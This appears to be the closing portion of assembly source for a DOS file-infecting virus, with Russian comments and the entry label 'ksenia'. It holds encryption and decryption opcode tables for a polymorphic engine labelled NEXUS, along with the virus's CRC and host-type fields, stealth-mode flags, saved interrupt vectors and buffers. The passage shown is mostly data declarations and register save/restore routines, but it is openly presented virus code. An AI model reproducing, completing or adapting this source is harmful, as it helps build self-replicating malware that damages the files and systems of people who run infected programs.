 enopI  db      10000000b,00110000b       ; XOR
        db      11110110b,00010000b       ; NOT
        db      10000000b,00000000b       ; ADD
        db      10000000b,00101000b       ; SUB
        db      11000000b,00001000b       ; ROR
        db      11000000b,00000000b       ; ROL
        db      11110110b,00011000b       ; NEG
        db      11111110b,00000000b       ; INC
        db      11111110b,00001000b       ; DEC

 deopI  db      10000000b,00110000b       ; XOR
        db      11110110b,00010000b       ; NOT
        db      10000000b,00101000b       ; SUB
        db      10000000b,00000000b       ; ADD
        db      11000000b,00000000b       ; ROL
        db      11000000b,00001000b       ; ROR
        db      11110110b,00011000b       ; NEG
        db      11111110b,00001000b       ; DEC
        db      11111110b,00000000b       ; INC
 oplen  equ     (this byte-deopI)/2

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; конец подсчета CRC
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 end_crc:

 random1                dw      0          ; пара случайных чисел
 random2                dw      0
 checksum               dd      0          ; CRC32 вируса
 host                   db      'C'        ; тип зараженной программы

 epb                    dw      0          ; Execute Parameter Block
                        dw      80h        ; командная строка
 seg0                   dw      0
                        dw      5ch        ; FCB#1
 seg1                   dw      0
                        dw      6ch        ; FCB#2
 seg2                   dw      0

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; конец шифрованной части вируса (2-м способом - internal)
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 endi:

 SaveRegs:
        pushf                   ; сохранение самих регистров
        push    eax bx edx si di bp es ds
        mov     bp,sp
        push    w [bp.rcx]      ; копирование адреса возврата
        mov     [bp.rcx],cx
        mov     bp,[bp.rbp]     ; восстановление BP
        ret

 LoadRegs:
        pop     cx              ; восстановление смещения возврата
        mov     bp,sp           ; копирование адреса возврата в пустую
        xchg    cx,[bp.rcx]
        pop     ds es bp di si edx bx eax
        popf
        ret

 rreg           struc
 rds            dw      ?       ; месторасположение сохраненных
 res            dw      ?       ; регистров в стеке
 rbp            dw      ?
 rdi            dw      ?
 rsi            dw      ?
 redx           dd      ?
 rbx            dw      ?
 reax           dd      ?
 rflg           dw      ?
 rcx            dw      ?
 rreg           ends

 original       db      0c3h       ; они должны быть последними !!!
                db      31 dup (0) ; они должны быть последними !!!

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; область недисковых данных - конец файловой части вируса
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 eov:

 io08           dw      ?,?        ; ячейки хранения векторов
 io21p          dw      ?,?        ; прерываний
 io24           dw      ?,?
 stf            db      ?          ; режим стелс (mcbcheck)
 seek_pos       dw      ?,?        ; позиция указателя (SeekSave)
 nrbytes        dw      ?          ; прочитанные байты (ReadStealth)

 r_used         dw      ?          ; 2 используемых регистра (NEXUS)
 w_flag         db      ?          ; (NEXUS)
 rm_flag        db      ?          ; хранение R/M поля индекса (NEXUS)
 crbuf          db      4 dup (?)
 nbuf           db      4 dup (?)
 fn_ptr         dw      ?,?        ; имя файла (ClrAttrib)
 attrib         dw      ?          ; аттрибуты (ClrAttrib)
 time           dw      ?          ; время файла (GetDate)
 date           dw      ?          ; дата файла (GetDate)
 delta          dw      ?          ; +смещение (входной параметр NEXUS)
 w95state       dw      ?          ; состояние Win95 (точнее WinOldAp)
 save_ax        dw      ?          ; передача параметров менеджера
 save_bx        dw      ?          ; резидентной части обработчикам
 save_es        dw      ?          ;
 reqhdr         dw      ?,?        ; REQUEST_HEADER
 intcall        dw      ?,?        ; SYS_INTERRUPT
 delay          db      ?          ; счетчик для Virus Guard

 header         db      32 dup (?)
 buffer         db      vsize dup (?)
 stacks         db      100h dup (?)

 eom:           end     ksenia
